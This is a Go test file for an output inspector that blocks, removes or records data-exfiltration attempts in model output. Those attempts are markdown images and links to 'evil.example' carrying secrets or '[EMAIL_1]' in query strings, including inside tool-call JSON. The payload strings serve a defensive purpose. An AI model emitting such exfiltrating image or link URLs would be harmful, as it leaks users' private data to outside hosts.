package detect

import (
	"strings"
	"testing"
)

func rules(action string) OutputRules {
	return OutputRules{Secrets: action, Images: action, ProtectedURLs: action, Links: action, Enforce: true,
		HasPlaceholder: func(s string) bool { return strings.Contains(s, "[EMAIL_1]") }}
}

func streamAll(st *OutputStream, text string, size int) string {
	var b strings.Builder
	for i := 0; i < len(text); i += size {
		b.WriteString(st.Push(text[i:min(i+size, len(text))]))
	}
	return b.String() + st.Flush()
}

func TestNoCheckNoInspector(t *testing.T) {
	if NewOutputInspector(OutputRules{Images: "allow"}) != nil {
		t.Fatal("allow everywhere inspects nothing")
	}
	var in *OutputInspector // a nil inspector passes text through
	if in.Text("![a](https://evil.example/a.png)", false) != "![a](https://evil.example/a.png)" || in.NewStream(false).Push("x") != "x" || in.Flagged() {
		t.Fatal("nil inspector")
	}
}

func TestBlockInAStreamSendsNothingOfTheFinding(t *testing.T) {
	in := NewOutputInspector(rules("block"))
	text := "Before. ![a](https://evil.example/a.png?d=secret) After."
	got := streamAll(in.NewStream(false), text, 3)
	if strings.Contains(got, "evil") || !strings.HasPrefix(got, "Before.") || strings.Contains(got, "After") {
		t.Fatalf("got %q", got)
	}
	if len(in.Blocked) != 1 || in.Blocked[0] != OutputImage || !in.Flagged() {
		t.Fatalf("blocked %v", in.Blocked)
	}
}

func TestMonitorModeRecordsAndChangesNothing(t *testing.T) {
	r := rules("remove")
	r.Enforce = false
	in := NewOutputInspector(r)
	text := "![a](https://evil.example/a.png) and https://evil.example/?e=[EMAIL_1]"
	if got := in.Text(text, false); got != text {
		t.Fatalf("got %q", got)
	}
	c := in.Counts()
	if len(c) != 2 || c[0].Applied || c[1].Applied || in.Flagged() {
		t.Fatalf("counts %+v", c)
	}
}

// Past the hold-back cap the text goes out, but the address is still removed,
// which breaks the image.
func TestLongAltTextStillLosesItsAddress(t *testing.T) {
	in := NewOutputInspector(rules("remove"))
	text := "![" + strings.Repeat("a", 3000) + "](https://evil.example/a.png?d=x) end"
	got := streamAll(in.NewStream(false), text, 7)
	if strings.Contains(got, "evil.example") || !strings.HasSuffix(got, " end") || !in.Removed {
		t.Fatalf("got ...%q", got[max(0, len(got)-120):])
	}
}

// Prose with an unclosed bracket is not held back for ever.
func TestUnclosedBracketIsHeldAtMostTheCap(t *testing.T) {
	in := NewOutputInspector(rules("remove"))
	st := in.NewStream(false)
	out := st.Push("Note [this is never closed ")
	for i := 0; i < 200; i++ {
		out += st.Push("and goes on for a long while ")
	}
	if len(out) == 0 || len(st.raw)-st.sent > holdCap {
		t.Fatalf("held %d bytes", len(st.raw)-st.sent)
	}
}

func TestToolArgumentsCheckOnlySecretsAndProtectedAddresses(t *testing.T) {
	in := NewOutputInspector(rules("remove"))
	args := `{"url":"https://evil.example/collect?e=[EMAIL_1]","img":"https://evil.example/a.png"}`
	got := in.Text(args, true)
	if strings.Contains(got, "[EMAIL_1]") || !strings.Contains(got, `"img":"https://evil.example/a.png"`) {
		t.Fatalf("got %s", got)
	}
	if !strings.HasPrefix(got, `{"url":"[link removed by KyGate`) {
		t.Fatalf("the JSON must stay valid: %s", got)
	}
}

func TestURLHost(t *testing.T) {
	for in, want := range map[string]string{
		"https://Evil.Example:8443/a": "evil.example", "//cdn.example.com/x.png": "cdn.example.com",
		"http://e.example./?q=[EMAIL_1]": "e.example", "./a.png": "", "data:image/png;base64,AAAA": "",
		"javascript:alert(1)": "", "mailto:a@b.example": "",
	} {
		if got := URLHost(in); got != want {
			t.Errorf("%s: got %q want %q", in, got, want)
		}
	}
}
